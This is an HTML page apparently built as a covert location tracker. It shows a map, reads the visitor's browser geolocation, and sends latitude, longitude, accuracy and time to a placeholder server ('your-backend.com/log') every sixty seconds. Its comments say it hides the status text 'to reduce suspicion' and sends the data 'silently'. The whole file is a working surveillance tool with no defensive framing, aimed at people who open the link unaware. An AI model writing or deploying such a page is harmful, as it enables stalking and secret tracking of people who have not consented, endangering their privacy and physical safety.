<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Update</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        #map { height: 100vh; width: 100%; }
        #status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.9); padding: 10px 20px; border-radius: 20px; font-size: 14px; color: #666; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 1000; }
    </style>
</head>
<body>

    <div id="map"></div>
    <div id="status">Locating...</div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // Initialize map
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap'
        }).addTo(map);

        let marker = null;
        let lat = null;
        let lng = null;
        const statusDiv = document.getElementById('status');

        // Function to send data
        function sendLocation(position) {
            lat = position.coords.latitude;
            lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const time = new Date().toISOString();

            // Update UI
            if (marker) map.removeLayer(marker);
            marker = L.marker([lat, lng]).addTo(map);
            map.setView([lat, lng], 15);
            statusDiv.textContent = "Location Updated";
            statusDiv.style.display = 'none'; // Hide status after first update to reduce suspicion

            // Send to server
            const data = { lat, lng, accuracy, time };
            
            // Use fetch to send data silently
            fetch('https://your-backend.com/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.log("Send failed", err));
        }

        // Start tracking
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
                statusDiv.textContent = "Location unavailable";
            });

            // Set up heartbeat
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(sendLocation);
            }, 60000); // 60 seconds
        } else {
            statusDiv.textContent = "Geolocation not supported";
        }
    </script>
</body>
</html>
